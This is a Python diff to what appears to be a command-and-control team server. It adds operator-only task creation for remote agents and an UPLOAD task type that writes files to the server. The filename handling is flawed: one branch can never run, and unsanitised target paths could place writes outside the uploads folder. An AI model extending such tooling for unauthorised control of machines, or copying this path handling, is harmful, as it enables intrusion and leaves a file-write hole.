@@ -1,6 +1,7 @@
 from .socket_custom import SocketCustom
 from database.database import HydrangeaDatabase
-import base64
+from .utils import base64Decode, base64Encode, generateRandomStr
+import os
 
 # Constants
 AGENT_COMMANDS_PREFIX = (
@@ -39,17 +40,46 @@ def handleAgentCommand(db: HydrangeaDatabase, socketClient: SocketCustom, client
         
         # Create new task
         if userInput.startswith("tasknew"): # tasknew AGENT_ID TASK_DATA_B64
-            print(userInputSplit[1], clientId, base64.b64decode(userInputSplit[2].encode("utf-8")).decode("utf-8"))
-
             if user.role not in ("operator", "admin"):
                 socketClient.sendall(b"ERROR: Unauthorized")
             elif len(userInputSplit) != 3:
                 socketClient.sendall(b"ERROR: Invalid input")
             else:
+                task: str = base64Decode(userInputSplit[2])
+                taskSplit = task.split(" ")
+                taskType = taskSplit[0]
+
+                # Intervention - pre-process specific Task types
+
+                ## For file upload, save the file on Team server, and store file path to it in Database
+                if taskType == "UPLOAD":
+                    # Get filename
+                    filePathOnTarget = taskSplit[2]
+                    filePathOnTargetSplitByBackslash = filePathOnTarget.split("\\")
+                    filePathOnTargetSplitByFrontslash = filePathOnTarget.split("/")
+                    filename = None
+                    if len(filePathOnTargetSplitByBackslash) != 0:
+                        filename = filePathOnTargetSplitByBackslash[-1]
+                    elif len(filePathOnTargetSplitByFrontslash) != 0:
+                        filename = filePathOnTargetSplitByFrontslash[-1]
+                    else:
+                        filename = generateRandomStr(7)
+
+                    # Write file on server, then store pathname to it in data..
+                    pathToSaveHereOnServer = os.path.join(os.getcwd(), "uploads", filename)
+                    with open(pathToSaveHereOnServer, "wb") as fileToSave:
+                        fileToSave.write(base64Decode(taskSplit[1], outputString=False))
+                    taskSplit[1] = pathToSaveHereOnServer
+                    task = " ".join(taskSplit)
+
+                # Log task
+                print(userInputSplit[1], clientId, task)
+
+                # Create new task
                 if db.createNewTask(
                     agentId=userInputSplit[1],
                     originClientId=clientId,
-                    task=base64.b64decode(userInputSplit[2].encode("utf-8")).decode("utf-8")
+                    task=task
                 ):
                     socketClient.sendall(f"SUCCESS: Task created for agent '{userInputSplit[1]}'".encode("utf-8"))
                 else:
@@ -72,8 +102,8 @@ def handleAgentCommand(db: HydrangeaDatabase, socketClient: SocketCustom, client
     "id": {task.id},
     "originClientId": "{task.originClientId}",
     "agentId": "{task.agentId}",
-    "taskB64": "{base64.b64encode(task.task.encode("utf-8")).decode("utf-8")}",
-    "outputB64": "{base64.b64encode((task.output if task.output is not None else "null").encode("utf-8")).decode("utf-8")}",
+    "taskB64": "{base64Encode(task.task)}",
+    "outputB64": "{base64Encode(task.output if task.output is not None else "null")}",
     "taskedAt": {task.taskedAt if task.taskedAt is not None else 0},
     "outputAt": {task.outputAt if task.outputAt is not None else 0}
 }},"""
